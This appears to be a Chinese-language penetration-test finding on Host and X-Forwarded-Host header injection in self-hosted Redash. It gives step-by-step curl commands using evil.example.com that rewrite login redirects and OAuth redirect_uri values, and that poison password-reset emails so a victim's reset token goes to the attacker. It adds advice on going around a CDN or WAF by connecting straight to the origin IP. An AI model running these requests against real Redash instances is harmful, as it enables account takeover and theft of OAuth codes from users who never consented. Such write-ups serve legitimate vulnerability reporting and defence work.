# Redash Host 头注入 → OAuth redirect_uri / 密码重置链接劫持

## 概述
Redash 基于 Flask/Werkzeug，生成站外绝对 URL（`url_for(_external=True)`、登录跳转、OAuth 回调）时直接采信请求里的 Host / X-Forwarded-Host。当前置 nginx 不剥离也不覆盖这些头、且应用启用 trust proxy 时，**未认证**请求即可：
- 改写根路径 302 跳转目标（开放重定向 / 钓鱼）；
- 改写 OAuth 授权请求的 `redirect_uri`（把授权码引到攻击者域）；
- 改写站内外部链接（缓存投毒面）；
- 把密码重置邮件里的链接指向攻击者域（reset token 泄露 → 账号接管）。

## 前置条件
- 自建 Redash 实例，存在 `/oauth/<provider>`、`/forgot` 入口。
- 前置 nginx 不剥离/不覆盖 Host、X-Forwarded-Host（实测本实例成立）。
- 应用信任代理头（ProxyFix / trust proxy，本实例成立）。
- 无需认证。

## 复现

### 1) 根路径跳转改写
```bash
curl -sk -D - -o /dev/null \
  -H 'X-Forwarded-Host: evil.example.com' \
  https://<target>/
# 期望：HTTP/1.1 302 Found
#       Location: https://evil.example.com/login?next=https%3A%2F%2Fevil.example.com%2F
```

### 2) OAuth redirect_uri 改写
```bash
curl -sk -D - -o /dev/null \
  -H 'X-Forwarded-Host: evil.example.com' \
  'https://<target>/oauth/google?next=/'
# 期望：302 → https://accounts.google.com/o/oauth2/v2/auth?...&redirect_uri=https%3A%2F%2Fevil.example.com%2Foauth%2Fgoogle_callback&scope=openid+email+profile&state=...&nonce=...
```

### 3) 直接用 Host 头（不依赖 XFH）
```bash
curl -sk -D - -o /dev/null \
  -H 'Host: evil.example.com' \
  --resolve <target>:443:<origin-ip> \
  https://<target>/
# 期望：Location 与步骤 1 相同 → nginx 未剥离 Host，直接透传给 Redash
```

### 4) 密码重置链接劫持（同一 URL 生成机制）
```bash
# 先取 csrf_token
curl -sk -c jar https://<target>/forgot | grep -o 'csrf_token[^>]*value="[^"]*"'
# 触发重置
curl -sk -D - -b jar \
  -H 'X-Forwarded-Host: evil.example.com' -H 'X-Forwarded-Proto: http' \
  -d 'csrf_token=<tok>&email=<victim@example.com>' \
  https://<target>/forgot
# 期望：200 + "If we found an account associated with that email address, you will find an email from us in your inbox shortly."
# 重置邮件里的链接按 Host 生成 → 指向 evil.example.com，受害者点击即把 reset token 交给攻击者。
```

## 判据
- 302 的 `Location` 主机名跟随注入值 = Host 头注入成立。
- OAuth 授权 URL 中 `redirect_uri` 主机名为注入值 = URL 生成完全信任 Host。
- 步骤 3 返回与步骤 1 相同 → 连 `Host` 本身都未做白名单校验。
- 密码重置闭环需受害者收信并点击，属机制推断（邮件原文不可见）。

## 影响 / 升级面
- 密码重置链接投毒 → reset token 泄露 → 管理员账号接管。
- OAuth 授权码劫持（redirect_uri 指向攻击者域）。
- Web 缓存投毒（若前置有缓存层且未把 Host/XFH 纳入缓存键）。

## 失败 / 无效的常见原因
- 前置 CDN/WAF（如 CloudFront）会重写或拒绝伪造 Host → 需直连源站 IP 绕过边缘。
- nginx 用 `proxy_set_header Host $host` 覆盖，或显式剥离 X-Forwarded-Host。
- 应用未启用 trust proxy（Werkzeug 未做 ProxyFix）→ XFH 被忽略。
- 把通用提示页误判为"已发重置邮件"——需受害者侧收信才算闭环。
